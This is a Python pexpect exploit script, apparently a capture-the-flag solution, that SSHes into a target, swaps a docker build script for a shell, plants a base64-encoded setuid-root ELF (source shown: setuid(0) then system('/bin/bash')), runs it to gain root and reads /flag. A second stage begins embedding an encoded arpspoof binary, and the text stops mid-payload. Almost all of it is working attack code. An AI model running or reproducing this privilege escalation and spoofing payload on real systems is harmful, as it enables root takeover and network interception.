import time
import pexpect
import sys
promts = ['\$','#']
k = "ssh %s"%(sys.argv[1])
c = pexpect.spawn(k)
c.expect(promts,timeout=None)
print("[*] pwning stage1")
print("[*] modifying /opt/build-input/run.sh")
c.sendline('mv /opt/build-input/run.sh /opt/build-input/run.sh.bak')
c.expect(promts,timeout=None)
def write(content, to,t=None):
    c.sendline('cat <<":q" >> %s'%to)
    for j in content.splitlines():
        c.expect('>',timeout=None)
        c.sendline(j)
    c.sendline(":q")
    c.expect(promts,timeout=t)
script='''#!/bin/bash
bash'''
write(script,'/opt/build-input/run.sh')
c.sendline("chmod +x /opt/build-input/run.sh")
c.expect(promts,timeout=None)
print("[-] Done!")
print("[*] launching docker")
c.sendline("./build.sh")
c.expect(promts,timeout=None)
print("[-] Done!")
'''
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
void main()
{
  setuid(0);
  const char* cmd = "/bin/bash";
  system(cmd);
}
'''

payload = '''f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA0AUAAAAAAABAAAAAAAAAADgaAAAAAAAAAAAAAEAAOAAJ
AEAAHwAeAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCAAAAAAAAOAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJAAAAAAAADAkAAAAAAAAAACAA
AAAAAAEAAAAGAAAA2A0AAAAAAADYDSAAAAAAANgNIAAAAAAAYAIAAAAAAABoAgAAAAAAAAAAIAAA
AAAAAgAAAAYAAADwDQAAAAAAAPANIAAAAAAA8A0gAAAAAADgAQAAAAAAAOABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAIAAAAAAABUAgAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAAwAcAAAAAAADABwAAAAAAAMAHAAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA
UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS
5XRkBAAAANgNAAAAAAAA2A0gAAAAAADYDSAAAAAAACgCAAAAAAAAKAIAAAAAAAABAAAAAAAAAC9s
aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA
AAQAAAAUAAAAAwAAAEdOVQDl/TyDAurYpzAOPNGWnKvNGPd4YQEAAAABAAAAAQAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOgAAACAAAAAAAAAAAAAAAAAAAAAA
AAAAEgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAKAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAVgAAACAA
AAAAAAAAAAAAAAAAAAAAAAAAZQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAeQAAACAAAAAAAAAAAAAA
AAAAAAAAAAAACwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAGQAAACIAAAAAAAAAAAAAAAAAAAAAAAAA
AGxpYmMuc28uNgBzZXR1aWQAc3lzdGVtAF9fY3hhX2ZpbmFsaXplAF9fbGliY19zdGFydF9tYWlu
AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2dtb25fc3RhcnRfXwBfSnZfUmVnaXN0ZXJD
bGFzc2VzAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAR0xJQkNfMi4yLjUAAAAAAAACAAIAAAAA
AAAAAgACAAAAAAAAAAEAAQABAAAAEAAAAAAAAAB1GmkJAAACAJMAAAAAAAAA2A0gAAAAAAAIAAAA
AAAAANAGAAAAAAAA4A0gAAAAAAAIAAAAAAAAAJAGAAAAAAAAMBAgAAAAAAAIAAAAAAAAADAQIAAA
AAAA0A8gAAAAAAAGAAAAAQAAAAAAAAAAAAAA2A8gAAAAAAAGAAAAAwAAAAAAAAAAAAAA4A8gAAAA
AAAGAAAABAAAAAAAAAAAAAAA6A8gAAAAAAAGAAAABQAAAAAAAAAAAAAA8A8gAAAAAAAGAAAABgAA
AAAAAAAAAAAA+A8gAAAAAAAGAAAACAAAAAAAAAAAAAAAGBAgAAAAAAAHAAAAAgAAAAAAAAAAAAAA
IBAgAAAAAAAHAAAABwAAAAAAAAAAAAAASIPsCEiLBWUKIABIhcB0Av/QSIPECMMAAAAAAAAAAAD/
NXIKIAD/JXQKIAAPH0AA/yVyCiAAaAAAAADp4P////8lagogAGgBAAAA6dD/////JTIKIABmkAAA
AAAAAAAAMe1JidFeSIniSIPk8FBUTI0FugEAAEiNDUMBAABIjT0MAQAA/xXeCSAA9A8fRAAASI09
MQogAEiNBTEKIABVSCn4SInlSIP4DnYVSIsFrgkgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QA
AAAAAEiNPfEJIABIjTXqCSAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWBCSAASIXAdAxd
/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD2hCSAAAHUnSIM9VwkgAABVSInldAxIiz2CCSAA
6A3////oSP///13GBXgJIAAB88MPH0AAZi4PH4QAAAAAAEiNPREHIABIgz8AdQvpXv///2YPH0QA
AEiLBfkIIABIhcB06VVIieX/0F3pQP///1VIieVIg+wQvwAAAADonv7//0iNBZsAAABIiUX4SItF
+EiJx+h3/v//kMnDDx9AAEFXQVZBif9BVUFUTI0llgYgAFVIjS2WBiAAU0mJ9kmJ1Uwp5UiD7AhI
wf0D6A/+//9Ihe10IDHbDx+EAAAAAABMiepMifZEif9B/xTcSIPDAUg53XXqSIPECFtdQVxBXUFe
QV/DkGYuDx+EAAAAAADzwwAASIPsCEiDxAjDAAAAAQACAC9iaW4vYmFzaAAAAAEbAzs8AAAABgAA
AND9//+IAAAAAP7//7AAAAAQ/v//WAAAAED////IAAAAcP///+gAAADg////MAEAAAAAAAAUAAAA
AAAAAAF6UgABeBABGwwHCJABBxAUAAAAHAAAALD9//8rAAAAAAAAAAAAAAAUAAAAAAAAAAF6UgAB
eBABGwwHCJABAAAkAAAAHAAAAED9//8wAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQA
AABI/f//CAAAAAAAAAAAAAAAHAAAAFwAAABw/v//LAAAAABBDhCGAkMNBmcMBwgAAABEAAAAfAAA
AID+//9lAAAAAEIOEI8CQg4YjgNFDiCNBEIOKIwFSA4whgZIDjiDB00OQHIOOEEOMEEOKEIOIEIO
GEIOEEIOCAAUAAAAxAAAAKj+//8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAANAGAAAAAAAAkAYAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAMAAAAAAAA
AHAFAAAAAAAADQAAAAAAAACkBwAAAAAAABkAAAAAAAAA2A0gAAAAAAAbAAAAAAAAAAgAAAAAAAAA
GgAAAAAAAADgDSAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAJgCAAAAAAAABQAAAAAAAACQ
AwAAAAAAAAYAAAAAAAAAuAIAAAAAAAAKAAAAAAAAAJ8AAAAAAAAACwAAAAAAAAAYAAAAAAAAABUA
AAAAAAAAAAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAAAwAAAAAAAAABQAAAAAAAAABwAA
AAAAAAAXAAAAAAAAAEAFAAAAAAAABwAAAAAAAABoBAAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAA
AAAAABgAAAAAAAAA+///bwAAAAAAAAAIAAAAAP7//28AAAAASAQAAAAAAAD///9vAAAAAAEAAAAA
AAAA8P//bwAAAAAwBAAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPANIAAAAAAA
AAAAAAAAAAAAAAAAAAAAAKYFAAAAAAAAtgUAAAAAAAAAAAAAAAAAADAQIAAAAAAAR0NDOiAoRGVi
aWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAMAAQA4AgAAAAAAAAAAAAAAAAAAAAAAAAMAAgBUAgAAAAAAAAAAAAAAAAAAAAAA
AAMAAwB0AgAAAAAAAAAAAAAAAAAAAAAAAAMABACYAgAAAAAAAAAAAAAAAAAAAAAAAAMABQC4AgAA
AAAAAAAAAAAAAAAAAAAAAAMABgCQAwAAAAAAAAAAAAAAAAAAAAAAAAMABwAwBAAAAAAAAAAAAAAA
AAAAAAAAAAMACABIBAAAAAAAAAAAAAAAAAAAAAAAAAMACQBoBAAAAAAAAAAAAAAAAAAAAAAAAAMA
CgBABQAAAAAAAAAAAAAAAAAAAAAAAAMACwBwBQAAAAAAAAAAAAAAAAAAAAAAAAMADACQBQAAAAAA
AAAAAAAAAAAAAAAAAAMADQDABQAAAAAAAAAAAAAAAAAAAAAAAAMADgDQBQAAAAAAAAAAAAAAAAAA
AAAAAAMADwCkBwAAAAAAAAAAAAAAAAAAAAAAAAMAEACwBwAAAAAAAAAAAAAAAAAAAAAAAAMAEQDA
BwAAAAAAAAAAAAAAAAAAAAAAAAMAEgAACAAAAAAAAAAAAAAAAAAAAAAAAAMAEwDYDSAAAAAAAAAA
AAAAAAAAAAAAAAMAFADgDSAAAAAAAAAAAAAAAAAAAAAAAAMAFQDoDSAAAAAAAAAAAAAAAAAAAAAA
AAMAFgDwDSAAAAAAAAAAAAAAAAAAAAAAAAMAFwDQDyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAECAA
AAAAAAAAAAAAAAAAAAAAAAMAGQAoECAAAAAAAAAAAAAAAAAAAAAAAAMAGgA4ECAAAAAAAAAAAAAA
AAAAAAAAAAMAGwAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEA
FQDoDSAAAAAAAAAAAAAAAAAAGQAAAAIADgAABgAAAAAAAAAAAAAAAAAAGwAAAAIADgBABgAAAAAA
AAAAAAAAAAAALgAAAAIADgCQBgAAAAAAAAAAAAAAAAAARAAAAAEAGgA4ECAAAAAAAAEAAAAAAAAA
UwAAAAEAFADgDSAAAAAAAAAAAAAAAAAAegAAAAIADgDQBgAAAAAAAAAAAAAAAAAAhgAAAAEAEwDY
DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAA
AAAAAAAArAAAAAEAEgAICQAAAAAAAAAAAAAAAAAAugAAAAEAFQDoDSAAAAAAAAAAAAAAAAAAAAAA
AAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAAAEwDgDSAAAAAAAAAAAAAAAAAA1wAAAAEAFgDwDSAA
AAAAAAAAAAAAAAAA4AAAAAAAEwDYDSAAAAAAAAAAAAAAAAAA8wAAAAAAEQDABwAAAAAAAAAAAAAA
AAAABgEAAAEAGAAAECAAAAAAAAAAAAAAAAAAHAEAABIADgCgBwAAAAAAAAIAAAAAAAAALAEAACAA
AAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAGQAoECAAAAAAAAAAAAAAAAAASAEAABAAGQA4ECAAAAAA
AAAAAAAAAAAAJgEAABIADwCkBwAAAAAAAAAAAAAAAAAATwEAABIAAAAAAAAAAAAAAAAAAAAAAAAA
YwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAggEAABAAGQAoECAAAAAAAAAAAAAAAAAAjwEAACAAAAAA
AAAAAAAAAAAAAAAAAAAAngEAABECGQAwECAAAAAAAAAAAAAAAAAAqwEAABEAEACwBwAAAAAAAAQA
AAAAAAAAugEAABIADgAwBwAAAAAAAGUAAAAAAAAA0gAAABAAGgBAECAAAAAAAAAAAAAAAAAAiAEA
ABIADgDQBQAAAAAAACsAAAAAAAAAygEAABAAGgA4ECAAAAAAAAAAAAAAAAAA1gEAABIADgAABwAA
AAAAACwAAAAAAAAA2wEAACAAAAAAAAAAAAAAAAAAAAAAAAAA7wEAABECGQA4ECAAAAAAAAAAAAAA
AAAA+wEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAKQIAACIA
AAAAAAAAAAAAAAAAAAAAAAAAxAEAABIACwBwBQAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19K
Q1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21w
bGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9k
dW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAdGVzdC5jAF9fRlJBTUVfRU5EX18A
X19KQ1JfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJyYXlfc3RhcnQA
X19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkA
X0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBzeXN0ZW1AQEdMSUJDXzIuMi41AF9f
bGliY19zdGFydF9tYWluQEBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18A
X19kc29faGFuZGxlAF9JT19zdGRpbl91c2VkAF9fbGliY19jc3VfaW5pdABfX2Jzc19zdGFydABt
YWluAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19UTUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVU
YWJsZQBzZXR1aWRAQEdMSUJDXzIuMi41AF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQAALnN5
bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALm5vdGUuZ251LmJ1
aWxkLWlkAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lv
bl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0
YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5k
eW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAA
AAIAAAAAAAAAOAIAAAAAAAA4AgAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
IwAAAAcAAAACAAAAAAAAAFQCAAAAAAAAVAIAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAA
AAAAAAAAADEAAAAHAAAAAgAAAAAAAAB0AgAAAAAAAHQCAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQA
AAAAAAAAAAAAAAAAAABEAAAA9v//bwIAAAAAAAAAmAIAAAAAAACYAgAAAAAAABwAAAAAAAAABQAA
AAAAAAAIAAAAAAAAAAAAAAAAAAAATgAAAAsAAAACAAAAAAAAALgCAAAAAAAAuAIAAAAAAADYAAAA
AAAAAAYAAAABAAAACAAAAAAAAAAYAAAAAAAAAFYAAAADAAAAAgAAAAAAAACQAwAAAAAAAJADAAAA
AAAAnwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABeAAAA////bwIAAAAAAAAAMAQAAAAA
AAAwBAAAAAAAABIAAAAAAAAABQAAAAAAAAACAAAAAAAAAAIAAAAAAAAAawAAAP7//28CAAAAAAAA
AEgEAAAAAAAASAQAAAAAAAAgAAAAAAAAAAYAAAABAAAACAAAAAAAAAAAAAAAAAAAAHoAAAAEAAAA
AgAAAAAAAABoBAAAAAAAAGgEAAAAAAAA2AAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACE
AAAABAAAAEIAAAAAAAAAQAUAAAAAAABABQAAAAAAADAAAAAAAAAABQAAABgAAAAIAAAAAAAAABgA
AAAAAAAAjgAAAAEAAAAGAAAAAAAAAHAFAAAAAAAAcAUAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAA
AAAAAAAAAAAAAAAAAIkAAAABAAAABgAAAAAAAACQBQAAAAAAAJAFAAAAAAAAMAAAAAAAAAAAAAAA
AAAAABAAAAAAAAAAEAAAAAAAAACUAAAAAQAAAAYAAAAAAAAAwAUAAAAAAADABQAAAAAAAAgAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAnQAAAAEAAAAGAAAAAAAAANAFAAAAAAAA0AUAAAAA
AADSAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAKMAAAABAAAABgAAAAAAAACkBwAAAAAA
AKQHAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAA
sAcAAAAAAACwBwAAAAAAAA4AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAsQAAAAEAAAAC
AAAAAAAAAMAHAAAAAAAAwAcAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAL8A
AAABAAAAAgAAAAAAAAAACAAAAAAAAAAIAAAAAAAADAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
AAAAAADJAAAADgAAAAMAAAAAAAAA2A0gAAAAAADYDQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAgAAAAAAAAA1QAAAA8AAAADAAAAAAAAAOANIAAAAAAA4A0AAAAAAAAIAAAAAAAAAAAAAAAA
AAAACAAAAAAAAAAIAAAAAAAAAOEAAAABAAAAAwAAAAAAAADoDSAAAAAAAOgNAAAAAAAACAAAAAAA
AAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADmAAAABgAAAAMAAAAAAAAA8A0gAAAAAADwDQAAAAAA
AOABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAAmAAAAAEAAAADAAAAAAAAANAPIAAAAAAA
0A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAO8AAAABAAAAAwAAAAAAAAAA
ECAAAAAAAAAQAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD4AAAAAQAAAAMA
AAAAAAAAKBAgAAAAAAAoEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA/gAA
AAgAAAADAAAAAAAAADgQIAAAAAAAOBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA
AAAAAAMBAAABAAAAMAAAAAAAAAAAAAAAAAAAADgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAA
AAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABoEAAAAAAAAHgGAAAAAAAAHQAAAC8A
AAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA4BYAAAAAAABFAgAAAAAA
AAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAACUZAAAAAAAA
DAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
'''
print("[*] writing suid program")
write(payload,'/work/tmp')
c.sendline('base64 -d /work/tmp > /work/rootme')
c.expect(promts,timeout=None)
c.sendline('rm -rf /work/tmp')
c.expect(promts,timeout=None)
c.sendline('chown root /work/rootme')
c.expect(promts,timeout=None)
c.sendline('chmod +s+x /work/rootme')
c.expect(promts,timeout=None)
print("[-] Done!")
print("[*] exiting docker..")
c.sendline('exit')
c.expect('.*$.*',timeout=None)
print("[-] Done!")
time.sleep(2)
print("[*] obtaining root")
c.sendline('/opt/build-input/rootme')
c.expect(promts,timeout=None)
print("[-] Done!")
print("[*] cat /flag")
c.sendline('cat /flag')
c.expect(promts,timeout=None)
c.sendline("echo")
c.expect("\[",timeout=None)
print("")
print("STAGE"+c.before.split("STAGE")[1].splitlines()[0])
print("")
print("[-] stage1 completed!")
time.sleep(3)
print("[*] pwning stage2")
print("[*] copying arpspoof..")
#stage2
payload='''f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAYAtAAAAAAABAAAAAAAAAAGguAAAAAAAAAAAAAEAAOAAJ
AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCQAAAAAAAOAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAALwWAAAAAAAAvBYAAAAAAAAAACAA
AAAAAAEAAAAGAAAAEB4AAAAAAAAQHmAAAAAAABAeYAAAAAAAoAIAAAAAAACoAgAAAAAAAAAAIAAA
AAAAAgAAAAYAAAAoHgAAAAAAACgeYAAAAAAAKB5gAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAJAAAAAAABUAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAAkBMAAAAAAACQE0AAAAAAAJATQAAAAAAAdAAAAAAAAAB0AAAAAAAAAAQAAAAAAAAA
UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS
5XRkBAAAABAeAAAAAAAAEB5gAAAAAAAQHmAAAAAAAPABAAAAAAAA8AEAAAAAAAABAAAAAAAAAC9s
aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA
AAQAAAAUAAAAAwAAAEdOVQAnriutpfKNrbTeOz9sjgFGCaxa7QEAAAABAAAAAQAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgAAABIAAAAAAAAAAAAAAAAAAAAA
AAAALgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAVgAAABIA
AAAAAAAAAAAAAAAAAAAAAAAAcgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAjQAAABIAAAAAAAAAAAAA
AAAAAAAAAAAAhwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAmgAAABIAAAAAAAAAAAAAAAAAAAAAAAAA
YQAAABIAAAAAAAAAAAAAAAAAAAAAAAAArAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAABIAAAAA
AAAAAAAAAAAAAAAAAAAATwAAABIAAAAAAAAAAAAAAAAAAAAAAAAARAAAABIAAAAAAAAAAAAAAAAA
AAAAAAAAawAAABIAAAAAAAAAAAAAAAAAAAAAAAAAEgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAHwAA
ABIAAAAAAAAAAAAAAAAAAAAAAAAAlAAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwAAABIAAAAAAAAA
AAAAAAAAAAAAAAAAAGxpYmMuc28uNgBzb2NrZXQAX19wcmludGZfY2hrAHBlcnJvcgBzdHJuY3B5
AHB1dHMAX19zdGFja19jaGtfZmFpbABldGhlcl9hdG9uAHN0cnRvbABldGhlcl9udG9hAGluZXRf
YWRkcgBtYWxsb2MAaW9jdGwAaWZfbmFtZXRvaW5kZXgAY2xvc2UAc2VuZHRvAHNsZWVwAF9fbGli
Y19zdGFydF9tYWluAF9fZ21vbl9zdGFydF9fAEdMSUJDXzIuMy40AEdMSUJDXzIuNABHTElCQ18y
LjIuNQAAAAACAAIAAwACAAIAAgACAAIAAgAAAAIAAgACAAIABAACAAIAAgAAAAAAAQADAAEAAAAQ
AAAAAAAAAHQZaQkAAAQAuwAAABAAAAAUaWkNAAADAMcAAAAQAAAAdRppCQAAAgDRAAAAAAAAAPgf
YAAAAAAABgAAAAoAAAAAAAAAAAAAABggYAAAAAAABwAAAAEAAAAAAAAAAAAAACAgYAAAAAAABwAA
AAIAAAAAAAAAAAAAACggYAAAAAAABwAAAAMAAAAAAAAAAAAAADAgYAAAAAAABwAAAAQAAAAAAAAA
AAAAADggYAAAAAAABwAAAAUAAAAAAAAAAAAAAEAgYAAAAAAABwAAAAYAAAAAAAAAAAAAAEggYAAA
AAAABwAAAAcAAAAAAAAAAAAAAFAgYAAAAAAABwAAAAgAAAAAAAAAAAAAAFggYAAAAAAABwAAAAkA
AAAAAAAAAAAAAGAgYAAAAAAABwAAAAsAAAAAAAAAAAAAAGggYAAAAAAABwAAAAwAAAAAAAAAAAAA
AHAgYAAAAAAABwAAAA0AAAAAAAAAAAAAAHggYAAAAAAABwAAAA4AAAAAAAAAAAAAAIAgYAAAAAAA
BwAAAA8AAAAAAAAAAAAAAIggYAAAAAAABwAAABAAAAAAAAAAAAAAAJAgYAAAAAAABwAAABEAAAAA
AAAAAAAAAJggYAAAAAAABwAAABIAAAAAAAAAAAAAAEiD7AhIiwV1GCAASIXAdAXoMwEAAEiDxAjD
AAAAAAAAAAAAAAAAAAD/NWIYIAD/JWQYIAAPH0AA/yViGCAAaAAAAADp4P////8lWhggAGgBAAAA
6dD/////JVIYIABoAgAAAOnA/////yVKGCAAaAMAAADpsP////8lQhggAGgEAAAA6aD/////JToY
IABoBQAAAOmQ/////yUyGCAAaAYAAADpgP////8lKhggAGgHAAAA6XD/////JSIYIABoCAAAAOlg
